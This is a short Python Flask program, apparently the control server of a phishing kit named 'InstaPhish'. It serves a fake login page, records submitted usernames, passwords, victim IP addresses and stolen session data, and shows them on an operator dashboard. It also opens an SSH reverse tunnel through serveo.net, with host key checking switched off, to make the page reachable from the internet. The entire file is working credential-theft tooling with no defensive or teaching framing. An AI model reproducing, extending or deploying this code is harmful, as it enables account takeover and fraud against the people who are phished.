# HEADER: CONTROL SERVER
import os, time, sys, threading, subprocess
from flask import Flask, request, render_template_string, send_from_directory

app = Flask(__name__)
C = []
S = []
PAGE = "index.html"

HTML = """
<!DOCTYPE html><html><head><title>InstaPhish</title>
<style>body{font-family:monospace;background:#0a0a0a;color:#00ff41}
h1{color:#ff0044}table{width:100%;border-collapse:collapse}th,td{border:1px solid #00ff41;padding:8px}
textarea{width:100%;background:#000;color:#0f0;border:1px solid #00ff41}</style></head><body>
<h1>InstaPhish</h1><p>Credentials: {{cc}} | Sessions: {{sc}}</p>
<h2>Credentials</h2><table><tr><th>Time</th><th>User</th><th>Pass</th><th>IP</th></tr>
{% for e in cr %}<tr><td>{{e.t}}</td><td>{{e.u}}</td><td>{{e.p}}</td><td>{{e.i}}</td></tr>{% endfor %}</table>
<h2>Sessions</h2><table><tr><th>Time</th><th>Data</th></tr>
{% for e in ss %}<tr><td>{{e.t}}</td><td><textarea>{{e.d}}</textarea></td></tr>{% endfor %}</table>
<form action="/c" method="post"><button type="submit">Clear</button></form></body></html>"""

@app.route('/')
def d():
    return render_template_string(HTML, cr=C[::-1][:50], cc=len(C), ss=S[::-1][:30], sc=len(S))

@app.route('/p')
def p():
    return send_from_directory('.', PAGE)

@app.route('/h', methods=['POST'])
def h():
    C.append({"u":request.form.get('username',''),"p":request.form.get('password',''),"i":request.remote_addr,"t":time.strftime("%H:%M:%S")})
    return "OK"

@app.route('/s', methods=['POST'])
def s():
    S.append({"d":request.get_data(as_text=True),"t":time.strftime("%H:%M:%S")})
    return "OK"

@app.route('/c', methods=['POST'])
def c():
    C.clear(); S.clear(); return "<script>window.location='/'</script>"

def tun():
    subprocess.run(["ssh","-o","StrictHostKeyChecking=no","-R","80:localhost:8080","serveo.net"])

if __name__ == '__main__':
    if not os.path.exists(PAGE): sys.exit(1)
    threading.Thread(target=tun, daemon=True).start()
    app.run(host='0.0.0.0', port=8080, debug=False)